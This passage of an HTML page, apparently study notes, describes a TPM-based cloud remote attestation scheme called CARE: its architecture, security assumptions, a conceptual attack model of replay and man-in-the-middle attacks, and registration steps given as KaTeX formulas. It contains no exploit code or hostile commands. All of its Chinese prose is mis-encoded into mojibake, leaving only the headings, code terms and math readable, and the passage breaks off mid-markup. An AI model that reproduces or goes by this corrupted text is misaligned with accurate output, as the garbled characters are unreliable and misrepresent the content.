id="é›¶çŸ¥è¯†è¯æ˜çš„å·¥ä½œæµç¨‹ï¼ˆç®€å•ä¾‹å­ï¼‰">é›¶çŸ¥è¯†è¯æ˜çš„å·¥ä½œæµç¨‹ï¼ˆç®€å•ä¾‹å­ï¼‰</h4><ol><li><strong>å£°æ˜</strong>ï¼šè¯æ˜è€…å®£å¸ƒâ€œæŸä¸ªå‘½é¢˜ä¸ºçœŸâ€ã€‚</li><li><strong>æŒ‘æˆ˜</strong>ï¼šéªŒè¯è€…éšæœºç”Ÿæˆä¸€ä¸ªé—®é¢˜ï¼Œè¦æ±‚è¯æ˜è€…å›ç­”ã€‚</li><li><strong>å“åº”</strong>ï¼šè¯æ˜è€…åŸºäºå…¶ç§˜å¯†çŸ¥è¯†å›ç­”é—®é¢˜ã€‚</li><li><strong>éªŒè¯</strong>ï¼šéªŒè¯è€…æ ¹æ®å£°æ˜å’Œè§„åˆ™éªŒè¯è¯æ˜è€…çš„ç­”æ¡ˆæ˜¯å¦ç¬¦åˆæ¡ä»¶ã€‚</li></ol><p>è¿™ä¸ªè¿‡ç¨‹é€šå¸¸é‡å¤å¤šæ¬¡ï¼Œä»¥é™ä½æ¬ºéª—æˆåŠŸçš„æ¦‚ç‡ã€‚</p><h2 id="Overview">Overview</h2><p>ä»‹ç»å¾ªç¯è¿œç¨‹è®¤è¯ä½“ç³»ç»“æ„ã€å®‰å…¨å‡è®¾ã€è®¾è®¡ç›®æ ‡å’Œæ”»å‡»æ¨¡å‹ã€‚</p><h3 id="Infrastructure-requirement">Infrastructure requirement</h3><p>åŸºç¡€è®¾æ–½è¦æ±‚ï¼ˆInfrastructure requirementï¼‰ï¼š</p><p>è¦æ±‚æœåŠ¡å™¨é…å¤‡<code>tpm</code>ï¼Œè€Œ<code>vm</code>é…å¤‡<code>vtpm</code>ã€‚</p><h3 id="Architecture">Architecture</h3><p>æ¨¡å‹æ„å»º</p><h4 id="Cloud-Server-CS">Cloud Server (CS)</h4><p>è¿‡ç¨‹æ­¥éª¤ï¼š</p><ol><li><p>æ¯ä¸ªäº‘æœåŠ¡å™¨å’Œè™šæ‹Ÿæœºå¿…é¡»ä¸»åŠ¨æ³¨å†ŒCSçš„æ³¨å†Œæ¨¡å—ã€‚</p></li><li><p>äº‘æœåŠ¡å™¨åŠå…¶æ‰˜ç®¡çš„è™šæ‹Ÿæœºä½œä¸ºè¯æ˜è€…ï¼Œç”Ÿæˆè¿œç¨‹è®¤è¯æ‰€éœ€çš„è¯æ®ä¿¡æ¯ã€‚åŒæ—¶ï¼Œäº‘æœåŠ¡å™¨è¿˜å……å½“éªŒè¯è€…ã€‚å½“éœ€è¦æä¾›è¿œç¨‹è®¤è¯æœåŠ¡æ—¶ï¼Œäº‘ç®¡ç†ä¸­å¿ƒå°†éªŒè¯è€…çš„åŸºçº¿å€¼å¹¶å‘åˆ†å‘ç»™æŒ‡å®šçš„éªŒè¯è€…ã€‚</p></li><li><p>éªŒè¯è€…åœ¨æŒ‡å®šçš„ç›¸é‚»äº‘æœåŠ¡å™¨åŠå…¶ä¸Šè¿è¡Œçš„æ‰€æœ‰è™šæ‹Ÿæœºä¸Šæ‰§è¡Œè¿œç¨‹è®¤è¯æ“ä½œã€‚</p></li><li><p>éªŒè¯æ–¹å°†è®¤è¯ç»“æœä¸ŠæŠ¥ç»™äº‘å¹³å°ç®¡ç†ä¸­å¿ƒã€‚</p></li></ol><h4 id="Cloud-Management-Center-CMC">Cloud Management Center (CMC)</h4><p>ç”±ä¸¤ä¸ªæ¨¡å—æ„æˆ</p><ol><li><p>æ³¨å†Œæ¨¡å—RM (Register Module)ï¼š</p><p>è´Ÿè´£å­˜å‚¨äº‘æœåŠ¡å™¨ã€è™šæ‹Ÿæœºçš„<code>id</code>ã€<code>AIKå…¬é’¥</code>å’Œé‰´æƒã€‚</p></li><li><p>åŸºçº¿å€¼åº“ï¼š</p><p>è´Ÿè´£å­˜å‚¨æ‰€æœ‰è¯æ˜è€…çš„åŸºçº¿å€¼ã€‚</p></li></ol><h3 id="Assumptions">Assumptions</h3><p>å‡è®¾æ‰€æœ‰çš„äº‘æœåŠ¡å™¨éƒ½é…å¤‡äº†ç¡¬ä»¶<code>tpm</code>ï¼Œè™šæ‹Ÿæœºæ‹¥æœ‰<code>vtpm</code>ï¼Œäº‘å¹³å°çš„ç®¡ç†ä¸­å¿ƒæ˜¯å®Œå…¨å®‰å…¨çš„ã€‚æ­¤å¤–ï¼ŒCAREéœ€è¦å››ä¸ªåŸºæœ¬å…ˆå†³æ¡ä»¶ã€‚</p><p>é¦–å…ˆï¼Œå°½ç®¡å®¹æ˜“å—åˆ°ç¡¬ä»¶æ”»å‡»ï¼Œå¦‚<code>TPM</code>å›æ»šæ”»å‡»ã€ç³»ç»Ÿé‡å¯æ”»å‡»å’Œæ¶æ„<code>SMM</code>å¤„ç†ç¨‹åºæ”»å‡»ï¼Œä½†å‡è®¾äº‘èŠ‚ç‚¹çš„<code>TPM</code>æ˜¯å®‰å…¨çš„ã€‚è¿™æ„å‘³ç€å®‰å…¨å¯†é’¥ã€éæ˜“å¤±æ€§å†…å­˜RAM ï¼ˆ<code>NVRAM</code>ï¼‰å’Œå¹³å°é…ç½®å¯„å­˜å™¨ï¼ˆ<code>pcr</code>ï¼‰ä¸ä¼šå—åˆ°ç ´åã€‚</p><p>å…¶æ¬¡ï¼Œæ”»å‡»è€…ä¸èƒ½æ¨¡æ‹Ÿ<code>TPM</code>è½¯ä»¶ã€ä¼ªé€ è®¤è¯ç»“æœæˆ–ä¼ªé€ æ•°æ®ç­¾åï¼Œå› ä¸ºåŠ å¯†å¯†é’¥çš„ç§é’¥æ˜¯ä¸å¯è¿ç§»çš„ï¼Œå¹¶ä¸”ç”±ç‰©ç†<code>TPM</code>ä¿æŠ¤ã€‚</p><p>ç¬¬ä¸‰ï¼Œå‡è®¾èŠ¯ç‰‡ç”Ÿæˆçš„å¯†é’¥ã€å“ˆå¸Œå€¼å’Œä¼ªéšæœºæ•°å¯ä»¥æŠµæŠ—å†²çªæˆ–æš´åŠ›æ”»å‡»ï¼Œå› æ­¤é‡å†™æˆ–å›æ»šç‰©ç†<code>TPM</code>çš„<code>PCR</code>å€¼åœ¨å¯†ç å­¦ä¸Šæ˜¯ä¸å¯è¡Œçš„ã€‚</p><p>ç¬¬å››ï¼Œè€ƒè™‘äº†æ”»å‡»è€…å…¥ä¾µè™šæ‹Ÿæœºå’Œäº‘æœåŠ¡å™¨çš„åœºæ™¯ï¼Œç›®çš„æ˜¯é€šè¿‡ç¯¡æ”¹æ ¸å¿ƒæ“ä½œç³»ç»Ÿç»„ä»¶æ¥æå‡ç‰¹æƒï¼ŒåŒæ—¶æ’é™¤äº†æ‰€æœ‰äº‘æœåŠ¡å™¨éƒ½è¢«å…¥ä¾µçš„åœºæ™¯ã€‚</p><h3 id="Design-Goals">Design Goals</h3><h4 id="CAREçš„å®‰å…¨ç›®æ ‡">CAREçš„å®‰å…¨ç›®æ ‡</h4><ol><li>å®‰å…¨â€”â€”é‡æ–°è®¾è®¡çš„æ–¹æ¡ˆæ²¡æœ‰å¼•å…¥æ–°çš„æ”»å‡»é¢ã€‚ä¾‹å¦‚ï¼Œå¼•å…¥çš„è¿‡æ»¤æœºåˆ¶ä¸ä¼šé™ä½è¿œç¨‹è®¤è¯æœåŠ¡çš„å®‰å…¨æ€§ã€‚</li><li>å¯ä¿¡åº¦â€”â€”è¯¥æ–¹æ³•åº”è¯¥éªŒè¯å¤šæ–¹å‚ä¸çš„è¿è¡Œæ—¶ç¯å¢ƒçš„å¯ä¿¡åº¦ï¼Œä¸ºæ·±åº¦å­¦ä¹ æœåŠ¡æä¾›å—æ§çš„è¿è¡Œæ—¶ç¯å¢ƒã€‚</li><li>å®Œæ•´æ€§â€”â€”è¯¥æ–¹æ³•åœ¨å¯åŠ¨æ—¶ä¿æŠ¤è™šæ‹Ÿæœºå†…åº”ç”¨ç¨‹åºçš„å®Œæ•´æ€§ï¼Œé˜²æ­¢æ–‡ä»¶ä¿®æ”¹æ”»å‡»ã€‚</li></ol><h4 id="CAREçš„éƒ¨ç½²ç›®æ ‡">CAREçš„éƒ¨ç½²ç›®æ ‡</h4><ol><li>å…¼å®¹æ€§å’Œç¨³å®šæ€§â€”â€”è¯¥æ–¹æ³•åº”å°½é‡å‡å°‘å¯¹æ“ä½œç³»ç»Ÿå†…æ ¸çš„ä¿®æ”¹ï¼Œä»¥é˜²æ­¢ä¸­æ–­ç”¨æˆ·ä¸šåŠ¡è¿è¥å’Œäº‘æœåŠ¡å¯ç”¨æ€§ã€‚</li><li>å®ç”¨æ€§â€”â€”æ‰€æå‡ºçš„æ–¹æ³•åº”è¯¥ç¡®ä¿åŠ è½½åº”ç”¨å±‚ç¨‹åºæ—¶å®Œæ•´æ€§éªŒè¯çš„å‡†ç¡®æ€§ã€‚</li><li>å¯æ‰©å±•æ€§â€”â€”éšç€è™šæ‹Ÿæœºæ•°é‡çš„å¢åŠ ï¼Œè¯æ˜æ–¹æ³•åº”è¯¥ä¿æŒæœ‰æ•ˆã€‚</li></ol><h3 id="Attack-Model">Attack Model</h3><p>ç¡®å®šäº†ä¸¤ç§ä¸»è¦çš„æ”»å‡»ç±»å‹:</p><ol><li>é‡æ”¾æ”»å‡»ï¼Œåœ¨è¿™ç§æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…ç§˜å¯†åœ°æˆªå–å¹¶å‘æœåŠ¡å™¨é‡æ–°å‘é€ç”¨æˆ·æ•°æ®åŒ…ï¼Œè€Œä¸ä¸ºç‰¹å®šç›®çš„è¿›è¡Œä¿®æ”¹ã€‚</li><li>ä¸­é—´äºº(<code>MITM</code>)æ”»å‡»ï¼Œæ”»å‡»è€…çªƒå¬ç½‘ç»œé€šä¿¡ï¼Œå¯èƒ½å‘é€é”™è¯¯æ¶ˆæ¯ï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡æˆ–æŸåã€‚</li></ol><p>ç¡®å®šäº†ä¸¤ç§æ”»å‡»å¯¹è±¡ï¼š</p><ol><li>æ¶æ„ç”¨æˆ·:æ¶æ„ç”¨æˆ·å¯èƒ½ä¼šé€šè¿‡ä¿®æ”¹æŸäº›æ–‡ä»¶æ¥ä¸­æ–­æœåŠ¡æˆ–è¿è¡Œç¯å¢ƒï¼Œä»è€Œæå‡å¯¹ç³»ç»Ÿçš„æ§åˆ¶å¹¶å®ç°ä»–ä»¬çš„æ”»å‡»ç›®æ ‡ã€‚è¿™äº›ç”¨æˆ·å¯èƒ½ä¼šé€šè¿‡ä¿®æ”¹ç°æœ‰è®°å½•æˆ–æ·»åŠ æ— æ•ˆè®°å½•æ¥ç ´åè¯æ®ä¿¡æ¯ã€‚</li><li>æ¶æ„æœåŠ¡æä¾›å•†:ä½œä¸ºå¹³å°æ‰€æœ‰è€…ï¼Œä»–ä»¬æœ‰èƒ½åŠ›é€šè¿‡æŸäº›æ–¹å¼æ·»åŠ ã€ä¿®æ”¹æˆ–åˆ é™¤è½¯ä»¶çš„ä¿¡ä»»é“¾è¯æ®ã€‚æ¶æ„æœåŠ¡æä¾›å•†å¯èƒ½ä¸ºäº†å•†ä¸šåˆ©ç›Šæˆ–å…¶ä»–åŠ¨æœºä¼ªé€ æˆ–ä¿®æ”¹è½¯ä»¶è¯æ®ï¼Œç”šè‡³åˆ é™¤å¯èƒ½å¯¹ä»–ä»¬ä¸åˆ©çš„è¯æ®ã€‚</li></ol><h2 id="Remote-Attestation-Design">Remote Attestation Design</h2><p>ä¸»è¦åˆ†ä¸ºç³»ç»Ÿè®¾ç½®å’Œè¿œç¨‹è®¤è¯ä¸¤ä¸ªé˜¶æ®µ</p><h3 id="System-setup">System setup</h3><h4 id="äº‘èŠ‚ç‚¹æ³¨å†Œï¼ˆCloud-Node-Registrationï¼‰">äº‘èŠ‚ç‚¹æ³¨å†Œï¼ˆCloud Node Registrationï¼‰</h4><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241122210918893.png" alt="image-20241122210918893"></p><p>ä¸ºä¿è¯ä¿¡æ¯çš„å‡†ç¡®æ€§ï¼Œåœ¨äº‘èŠ‚ç‚¹å†…éƒ¨ç½²ä¿¡æ¯æ”¶é›†ä»£ç†ï¼ˆinformation Collection Agentï¼Œ<code>ICA</code>ï¼‰è¿›è¡Œä¿¡æ¯æ”¶é›†ã€‚</p><ul><li>æ­¥éª¤1ï¼šäº‘èŠ‚ç‚¹è¿›è¡Œèº«ä»½å¯†é’¥æ³¨å†Œï¼Œ<code>ICA</code>å‘<code>RM</code>å‘é€åŸºæœ¬ä¿¡æ¯(èŠ‚ç‚¹<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mi>D</mi></mrow><annotation encoding="application/x-tex">ID</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span>ã€è®¤è¯èº«ä»½å…¬é’¥(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>I</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub></mrow><annotation encoding="application/x-tex">AIK_{pub}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>)å’Œç­¾åå¯†é’¥å…¬é’¥(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub></mrow><annotation encoding="application/x-tex">EK_{pub}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>))ã€‚</li><li>æ­¥éª¤2aï¼š<code>RM</code>å°†<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>I</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub></mrow><annotation encoding="application/x-tex">AIK_{pub}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>ä¸<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub></mrow><annotation encoding="application/x-tex">EK_{pub}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>ç»‘å®šï¼Œå¹¶å­˜å‚¨<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mi>D</mi></mrow><annotation encoding="application/x-tex">ID</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span>å’Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>I</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub></mrow><annotation encoding="application/x-tex">AIK_{pub}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>ã€‚</li><li>æ­¥éª¤2bï¼š<code>RM</code>ç”Ÿæˆéšæœºæ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">nonce</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span></span></span></span>(é˜²æ­¢é‡æ”¾æ”»å‡»)å’Œä¼šè¯å¯†é’¥(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">ke</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span></span></span></span>)ï¼Œç„¶åæŒ‰ç…§ç­‰å¼(1)è®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î²</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">Î²</span></span></span></span>ã€‚</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>Î²</mi><mo>=</mo><mi>H</mi><mi>a</mi><mi>s</mi><mi>h</mi><mo stretchy="false">(</mo><mi>A</mi><mi>I</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(1)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">\beta=Hash(AIK_{pub}) \tag1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">Î²</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">h</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">1</span></span><span class="mord">)</span></span></span></span></span></span></p><ul><li>æ­¥éª¤2cï¼š<code>RM</code>æ ¹æ®ç­‰å¼(2)è®¡ç®—å¯†æ–‡<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">M_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>å¹¶å‘é€è‡³äº‘èŠ‚ç‚¹</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><msub><mi>M</mi><mn>1</mn></msub><mo>=</mo><msub><mi>E</mi><mrow><mi>E</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub></mrow></msub><mo stretchy="false">(</mo><mi>Î²</mi><mo separator="true">,</mo><mi>k</mi><mi>e</mi><mo separator="true">,</mo><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(2)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">M_1=E_{EK_{pub}}(\beta,ke,nonce)\tag2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1031em;vertical-align:-0.3531em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">E</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:-0.0715em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2901em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3531em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05278em;">Î²</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1.1031em;vertical-align:-0.3531em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">2</span></span><span class="mord">)</span></span></span></span></span></span></p><ul><li>æ­¥éª¤3aï¼šäº‘èŠ‚ç‚¹ä½¿ç”¨èƒŒä¹¦å¯†é’¥ç§é’¥(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>r</mi><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">EK_{pri}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>)è§£å¯†<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">M_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œå¦‚ç­‰å¼(3)ä¸­æ‰€æè¿°çš„ï¼Œä»¥è·å¾—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î²</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span><span class="katex-html" 